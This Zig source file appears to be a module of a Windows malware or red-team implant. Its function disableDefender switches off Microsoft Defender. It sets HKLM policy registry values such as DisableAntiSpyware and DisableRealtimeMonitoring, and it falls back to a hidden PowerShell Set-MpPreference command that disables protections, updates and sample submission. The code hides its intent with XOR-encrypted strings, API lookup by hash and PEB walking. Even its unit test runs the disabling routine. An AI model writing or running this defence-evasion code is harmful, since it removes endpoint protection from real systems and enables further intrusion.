const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub const DisableResult = enum(u32) {
    Success = 0,
    Partial = 1,
    NoAdmin = 2,
    Failed = 3,
};

const E = struct {
    pub const advapi32 = hash.xorEncrypt("advapi32.dll");
    pub const reg_subkey = hash.xorEncrypt("SOFTWARE\\Microsoft\\Windows Defender");
    pub const reg_rtp = hash.xorEncrypt("SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection");
    pub const reg_spynet = hash.xorEncrypt("SOFTWARE\\Microsoft\\Windows Defender\\SpyNet");
    pub const val_disas = hash.xorEncrypt("DisableAntiSpyware");
    pub const val_dsrm = hash.xorEncrypt("DisableRealtimeMonitoring");
    pub const val_dsbm = hash.xorEncrypt("DisableBehaviorMonitoring");
    pub const val_dsioav = hash.xorEncrypt("DisableIOAVProtection");
    pub const val_dspr = hash.xorEncrypt("DisableScanOnRealtimeEnable");
    pub const val_SubmitSamplesConsent = hash.xorEncrypt("SubmitSamplesConsent");
    pub const val_SpynetReporting = hash.xorEncrypt("SpynetReporting");
    pub const pshell = hash.xorEncrypt("powershell");
    pub const pshell_cmd_fmt = hash.xorEncrypt(" -Command \"& {Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdate $true -MAPSReporting 0 -SubmitSamplesConsent 2 -HighThreatDefaultAction 6 -LowThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -SevereThreatDefaultAction 6 -PUAProtection 0}\"");
};

fn loadAdvapi32() ?types.PVOID {
    const ntdll = peb_walk.getModuleByHash(hash.encryptedHashModule("ntdll.dll")) orelse return null;
    const ldr_load: *const fn (?*u16, ?*u32, *types.UNICODE_STRING, *types.PVOID) callconv(.winapi) types.NTSTATUS = @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("LdrLoadDll")) orelse return null,
    ));
    const mod_hash = hash.encryptedHashModule("advapi32.dll");
    if (peb_walk.getModuleByHash(mod_hash)) |base| return base;
    var wide_buf: [128]u8 = undefined;
    const name: []const u8 = "advapi32.dll";
    for (name, 0..) |c, i| {
        wide_buf[i * 2] = c;
        wide_buf[i * 2 + 1] = 0;
    }
    wide_buf[name.len * 2] = 0;
    wide_buf[name.len * 2 + 1] = 0;
    var unicode_str = types.UNICODE_STRING{
        .Length = @as(u16, @intCast(name.len * 2)),
        .MaximumLength = @as(u16, @intCast(name.len * 2 + 2)),
        .Buffer = @as([*]u16, @ptrCast(@alignCast(&wide_buf))),
    };
    var base: types.PVOID = undefined;
    if (ldr_load(null, null, &unicode_str, &base) < 0) return null;
    return base;
}

fn setDwordKey(subkey: []const u8, value_name: []const u8, value: u32) bool {
    const advapi32 = loadAdvapi32() orelse return false;

    const RegCreateKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCreateKeyExW")) orelse return false;
    const RegSetValueExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegSetValueExW")) orelse return false;

    const RegCreateKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, reserved: u32, class: ?[*:0]const u16, options: u32, access: u32, sec_attr: ?*const anyopaque, result: *types.HANDLE, disposition: ?*u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegCreateKeyExW));
    const RegSetValueExWFn: *const fn (hkey: types.HANDLE, name: ?[*:0]const u16, reserved: u32, typ: u32, data: [*]const u8, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegSetValueExW));

    var subkey_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
    subkey_us[i] = 0;

    var name_us: [128]u16 = undefined;
    var j: usize = 0;
    while (j < value_name.len and j < 127) : (j += 1) name_us[j] = value_name[j];
    name_us[j] = 0;

    const HKLM: types.HANDLE = @ptrFromInt(@as(usize, 0x80000002));
    var key: types.HANDLE = undefined;
    const cr_status = RegCreateKeyExWFn(HKLM, subkey_us[0 .. i + 1 :0], 0, null, 0, 0x02000000, null, &key, null);
    if (cr_status != 0) return false;

    var val_bytes: [4]u8 = undefined;
    std.mem.writeInt(u32, &val_bytes, value, .little);

    const sv_status = RegSetValueExWFn(key, name_us[0 .. j + 1 :0], 0, 4, @as([*]const u8, @ptrCast(&val_bytes)), 4);
    _ = engine.NtClose(key);
    return sv_status == 0;
}

fn runPowerShell() bool {
    var pshell_tmp: [E.pshell.len]u8 = undefined;
    var cmd_tmp: [E.pshell_cmd_fmt.len]u8 = undefined;
    hash.xorDecrypt(&E.pshell, &pshell_tmp);
    hash.xorDecrypt(&E.pshell_cmd_fmt, &cmd_tmp);

    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return false;
    const CreateProcessW = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const Sleep = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("Sleep")) orelse return false;

    const CreateProcessWFn: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, proc_attr: ?*const anyopaque, thread_attr: ?*const anyopaque, inherit: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(CreateProcessW));
    const SleepFn: *const fn (ms: u32) callconv(.winapi) void = @ptrCast(@alignCast(Sleep));

    var full_cmd: [768]u16 = undefined;
    var idx: usize = 0;
    for (pshell_tmp) |c| {
        if (idx < 767) {
            full_cmd[idx] = c;
            idx += 1;
        }
    }
    for (cmd_tmp) |c| {
        if (idx < 767) {
            full_cmd[idx] = c;
            idx += 1;
        }
    }
    full_cmd[idx] = 0;

    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);

    const ok = CreateProcessWFn(null, full_cmd[0 .. idx + 1 :0], null, null, 0, 0x08000000, null, null, @as(*const anyopaque, @ptrCast(&si)), @as(*anyopaque, @ptrCast(&pi)));
    if (ok != 0) SleepFn(3000);
    return ok != 0;
}

pub fn disableDefender() DisableResult {
    var tmp_sk: [E.reg_subkey.len]u8 = undefined;
    var tmp_rtp: [E.reg_rtp.len]u8 = undefined;
    var tmp_spn: [E.reg_spynet.len]u8 = undefined;
    hash.xorDecrypt(&E.reg_subkey, &tmp_sk);
    hash.xorDecrypt(&E.reg_rtp, &tmp_rtp);
    hash.xorDecrypt(&E.reg_spynet, &tmp_spn);

    var v_disas: [E.val_disas.len]u8 = undefined;
    var v_dsrm: [E.val_dsrm.len]u8 = undefined;
    var v_dsbm: [E.val_dsbm.len]u8 = undefined;
    var v_dsioav: [E.val_dsioav.len]u8 = undefined;
    var v_dspr: [E.val_dspr.len]u8 = undefined;
    var v_ssc: [E.val_SubmitSamplesConsent.len]u8 = undefined;
    var v_sr: [E.val_SpynetReporting.len]u8 = undefined;
    hash.xorDecrypt(&E.val_disas, &v_disas);
    hash.xorDecrypt(&E.val_dsrm, &v_dsrm);
    hash.xorDecrypt(&E.val_dsbm, &v_dsbm);
    hash.xorDecrypt(&E.val_dsioav, &v_dsioav);
    hash.xorDecrypt(&E.val_dspr, &v_dspr);
    hash.xorDecrypt(&E.val_SubmitSamplesConsent, &v_ssc);
    hash.xorDecrypt(&E.val_SpynetReporting, &v_sr);

    var success_count: u32 = 0;
    var total_attempts: u32 = 0;

    total_attempts += 1;
    if (setDwordKey(tmp_sk[0..], v_disas[0..], 1)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_rtp[0..], v_dsrm[0..], 1)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_rtp[0..], v_dsbm[0..], 1)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_rtp[0..], v_dsioav[0..], 1)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_rtp[0..], v_dspr[0..], 1)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_spn[0..], v_ssc[0..], 2)) success_count += 1;
    total_attempts += 1;
    if (setDwordKey(tmp_spn[0..], v_sr[0..], 0)) success_count += 1;

    if (success_count == total_attempts) return DisableResult.Success;

    if (runPowerShell()) return DisableResult.Success;
    if (success_count > 0) return DisableResult.Partial;

    return DisableResult.Failed;
}

test "disableDefender no crash" {
    _ = disableDefender();
}

test "DisableResult enum values" {
    try std.testing.expectEqual(@intFromEnum(DisableResult.Success), 0);
    try std.testing.expectEqual(@intFromEnum(DisableResult.Failed), 3);
}
